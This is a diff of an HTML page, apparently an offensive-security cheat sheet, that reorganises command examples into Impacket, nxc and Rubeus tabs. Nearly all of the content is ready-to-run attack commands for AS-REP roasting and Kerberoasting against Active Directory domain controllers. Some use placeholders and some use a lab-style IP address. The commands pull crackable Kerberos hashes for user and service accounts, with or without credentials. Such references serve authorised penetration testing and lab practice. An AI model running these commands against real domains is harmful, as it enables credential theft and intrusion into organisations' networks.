@@ -204,22 +204,55 @@
 
 <div class="content"><hr>
 <h3 id="as_rep-roasting">AS_REP Roasting</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Impacket</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >nxc</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames</span>
 </span></span><span class="line"><span class="cl">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile usernames.txt -no-pass -dc-ip &lt;DC&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames (nxc)</span>
-</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.10 -u usernames.txt -p <span class="s1">&#39;&#39;</span> --asreproast as_rep_hashes.txt
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Single user without creds</span>
 </span></span><span class="line"><span class="cl">impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 &lt;DOMAIN&gt;/&lt;USER&gt;
-</span></span></code></pre></div><h3 id="kerberoasting">Kerberoasting</h3>
-<h4 id="from-linux">From Linux</h4>
+</span></span></code></pre></div></div>
+</div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames (nxc)</span>
+</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.10 -u usernames.txt -p <span class="s1">&#39;&#39;</span> --asreproast as_rep_hashes.txt
+</span></span></code></pre></div></div>
+</div></p>
+<br>
+<hr>
+<h3 id="kerberoasting-from-linux">Kerberoasting (From Linux)</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Impacket</button>
+
+<button data-tabset="set2" data-tabcontent="tab2" >nxc</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Fix time skew</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -request <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;</span> -dc-ip &lt;DC_IP&gt;
-</span></span></code></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
+</span></span></code></pre></div></div>
+<p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Kerberoasting without cred</span>
 </span></span><span class="line"><span class="cl">sudo ntpdate -s &lt;DC&gt; <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -no-preauth &lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt; -usersfile usernames.txt -dc-host &lt;DC_IP&gt; &lt;DOMAIN&gt;/
-</span></span></code></pre></div><h4 id="from-windows">From Windows</h4>
+</span></span></code></pre></div></div></div>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap &lt;DC_IP&gt; -u &lt;UESR&gt; -p &lt;PASSWORD&gt; --kerberoasting kerberoast_hashes.txt
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
+<p>
+<button data-tabset="set3" data-tabcontent="tab1" class="active">rubeus</button>
+
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">.\rubeus.exe kerberoast /creduser:<span class="p">&lt;</span>DOMAIN<span class="p">&gt;</span>\<span class="p">&lt;</span>USER<span class="p">&gt;</span> /credpassword:<span class="p">&lt;</span>PASSWORD&gt;
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
